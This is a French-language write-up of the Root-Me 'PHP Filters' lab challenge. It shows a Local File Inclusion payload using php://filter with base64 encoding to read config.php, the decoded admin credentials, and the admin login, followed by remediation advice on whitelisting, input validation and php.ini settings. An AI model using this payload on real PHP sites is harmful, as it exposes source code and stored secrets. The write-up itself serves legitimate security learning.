# Root-Me – Challenge 2 : PHP Filters

## 1. Nom du challenge & URL

**Nom** : Challenge 2 – PHP Filters

**URL** : `http://challenge01.root-me.org/web-serveur/ch12/?inc=accueil.php`

---

## 2. Objectif

Activer votre compte pour accéder à l’espace privé.

---

## 3. Étapes de découverte de la vulnérabilité

1. En arrivant sur la page, on voit deux liens : **home** et **login**.
2. En regardant l’URL, on remarque le paramètre suivant :

   ```
   ?inc=accueil.php
   ```
Cela signifie que le site inclut un fichier PHP en fonction de ce paramètre.
Cette inclusion dynamique sans contrôle est une vulnérabilité appelée **LFI (Local File Inclusion)**.
3. Si on tente de mettre `login.php` ou `config.php` à la place, le serveur exécute le fichier au lieu d’afficher son contenu. On ne peut donc pas voir le mot de passe directement.
4. Pour contourner ça, on utilise un wrapper PHP (`php://filter`) pour forcer l’affichage du code source.

---

## 4. Payload utilisé

```text
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
```

### Explication du payload :

* `php://filter` : permet d’appliquer un filtre sur un fichier.
* `convert.base64-encode` : encode le contenu en Base64 pour empêcher son exécution.
* `resource=config.php` : fichier ciblé.

Cela permet d’afficher le contenu du fichier `config.php` en base64.

---

## 5. Résultat obtenu

Le site renvoie une chaîne encodée en Base64, par exemple :

```
PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK
```

Je la décode ensuite avec un site de décodage Base64.

Après décodage, on obtient :

```php
<?php
$username = "admin";
$password = "DAPt9D2mky0APAF";
?>
```

Ce qui me donne directement le mot de passe de l’administrateur.

---

## 6. Connexion en tant qu’administrateur

Sur la page de login, j’entre :

* **Username** : `admin`
* **Password** : `DAPt9D2mky0APAF`

La connexion fonctionne

---

## 7. Screenshot

Voici un screenshot montrant le résultat avec le contenu en Base64 :

![Base64 affiché](../images/challenge2.png)

---

## 8. Recommandations pour sécuriser la vulnérabilité

Pour éviter ce type de faille exploitant les PHP filters et wrappers, il faut :

### 8.1. Utiliser une whitelist stricte

Utiliser des identifiants plutôt que des noms de fichiers [1] [3] :
```php
$pages = [
    'home' => 'accueil.php',
    'login' => 'login.php'
];

$page = $_GET['page'] ?? 'home';
if (array_key_exists($page, $pages)) {
    include($pages[$page]);
}
```

### 8.2. Valider strictement les entrées

Rejeter tout caractère suspect (`:`, `/`, `\`, `.`, etc.) [1] [3] [4] :
```php
if (preg_match('/[^a-z0-9_-]/i', $_GET['page'])) {
    die('Invalid page parameter');
}
```

### 8.3. Utiliser basename() et des chemins absolus

Empêcher les traversées de répertoires (path traversal) [1] [3] :
```php
$file = basename($_GET['file']);
include(__DIR__ . '/pages/' . $file);
```

### 8.4. Stocker les informations sensibles en dehors du webroot

Utiliser des variables d'environnement plutôt que des fichiers de configuration PHP accessibles [3] [4].

### 8.5. Désactiver allow_url_include dans php.ini

Bloquer les inclusions distantes (RFI) [2] [4] :
```ini
allow_url_include = Off
```

### 8.6. Désactiver les wrappers PHP dangereux

Si possible via php.ini [2] [4] [5] :
```ini
allow_url_fopen = Off
```

---

## 9. Références

[1] [OWASP – Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) - Whitelist, validation des entrées et path traversal

[2] [PHP Manual – Runtime Configuration](https://www.php.net/manual/en/filesystem.configuration.php) - Documentation sur allow_url_include et allow_url_fopen

[3] [Vaadata – PHP Security Best Practices](https://www.vaadata.com/blog/php-security-best-practices-vulnerabilities-and-attacks/) - Validation des entrées et configuration sécurisée

[4] [Invicti – PHP Stream Wrappers](https://www.invicti.com/blog/web-security/php-stream-wrappers) - Protection contre les wrappers PHP

[5] [OWASP – Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) - Protection contre les traversées de chemins